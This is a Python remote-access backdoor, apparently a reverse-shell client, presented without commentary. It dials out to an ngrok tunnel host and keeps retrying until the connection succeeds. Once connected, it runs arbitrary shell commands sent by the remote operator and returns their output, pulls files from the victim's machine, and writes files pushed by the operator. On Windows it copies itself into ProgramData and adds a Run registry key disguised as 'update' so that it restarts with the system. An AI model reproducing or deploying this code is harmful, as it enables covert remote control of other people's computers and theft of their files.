import sys
import subprocess
import socket
import os
def persistence():
    if os.name == "nt":
        while True:
            if "DataApp" not in os.listdir("C:\\ProgramData"):
                os.mkdir("C:\\ProgramData\\DataApp")
                os.mkdir("C:\\ProgramData\\DataApp\\OSFiles")
                subprocess.call(f"copy {os.getcwd()}\\(filename) C:\\ProgramData\\DataApp\\OSFiles", shell = "True")
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\\ProgramData\\DataApp\\OSFiles\\(filename)"', shell = "True")
                sys.exit()
            else:
                break
    else:
        pass
def wow():    
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect(("0.tcp.ngrok.io",13973)) #port on server and client have to be same
            break      
        except:
            pass
wow()
def func(): 
    try:
        while True:
            data = s.recv(1024).decode("utf-8")
            if data == "get os":
                s.send(os.name.encode("utf-8"))
            elif len(data) > 0:
                if data[:2] == "cd":
                    print("changed")
                    os.chdir(data[3:])
                    output1 = f'{os.getcwd()}>' 
                    print(output1)
                    s.send(output1.encode("utf-8"))
                elif data == "download_file":
                    try:
                        tester = s.recv(1024).decode("utf-8")
                        f = open(tester,"rb")
                        x = f.read()                    
                        while (x):
                            print("in loop")
                            s.sendall(x)               
                            x = f.read()                                       
                        f.close() 
                        print("file closed")                  
                    except:
                        pass
                elif data == "send_file":                   
                        x = s.recv(1024).decode("utf-8")
                        new_file = open(x,"wb")
                        print("file opened")                 
                        data = s.recv(5000)      
                        while True:
                            try:
                                s.settimeout(1)
                                new_file.write(data)
                                data = s.recv(5000)      
                            except:
                                break
                else: 
                    cmd1 = subprocess.Popen(data,shell = "True", stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                    if len(cmd1.stdout.read()) != 0:
                        cmd = subprocess.Popen(data,shell = "True", stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                        s.send(cmd.stdout.read() + cmd.stderr.read())
                    else:
                        s.send("Command executed".encode("utf-8"))            
            else:
                pass
    except:
        try:
            wow()
            func()
        except:
            print("Error has been encountered")
persistence()
func()          
                       
